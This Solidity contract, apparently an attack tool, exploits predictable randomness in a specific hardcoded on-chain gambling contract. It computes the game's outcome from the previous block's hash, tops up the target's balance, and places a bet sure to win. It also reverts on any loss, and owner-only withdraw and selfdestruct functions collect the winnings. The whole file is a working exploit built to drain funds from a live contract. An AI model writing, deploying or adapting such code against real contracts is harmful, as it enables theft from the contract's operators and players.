1 pragma solidity ^0.5.0;
2 
3 interface TargetInterface {
4     function Set_your_game_number(string calldata s) external payable;
5 }
6 
7 contract DoublerCleanup {
8     
9     address payable private constant targetAddress = 0x28cC60C7c651F3E81E4B85B7a66366Df0809870f;
10 
11     address payable private owner;
12     
13     modifier onlyOwner {
14         require(msg.sender == owner);
15         _;
16     }
17     
18     constructor() public payable {
19         owner = msg.sender;
20     }
21     
22     function ping(bool _keepBalance) public payable onlyOwner {
23         uint targetBalance = targetAddress.balance;
24         require(targetBalance > 0.2 ether);
25 
26         uint8 betNum = uint8(blockhash(block.number - 1)[31]) & 0xf;
27         require(betNum != 0x0 && betNum != 0xf);
28         string memory betString = betNum < 8 ? "L" : "H";
29 
30         uint256 ourBalanceInitial = address(this).balance;
31         
32         if (targetBalance < 0.3 ether) {
33             uint256 toAdd = 0.3 ether - targetBalance;
34             (bool success,) = targetAddress.call.value(toAdd)("");
35             require(success);
36         }
37 
38         TargetInterface target = TargetInterface(targetAddress);
39         target.Set_your_game_number.value(0.1 ether)(betString);
40 
41         require(address(this).balance > ourBalanceInitial);
42         
43         if (!_keepBalance) {
44             owner.transfer(address(this).balance);
45         }
46     }
47     
48     function withdraw() public onlyOwner {
49         owner.transfer(address(this).balance);
50     }    
51     
52     function kill() public onlyOwner {
53         selfdestruct(owner);
54     }    
55     
56     function () external payable {
57     }
58     
59 }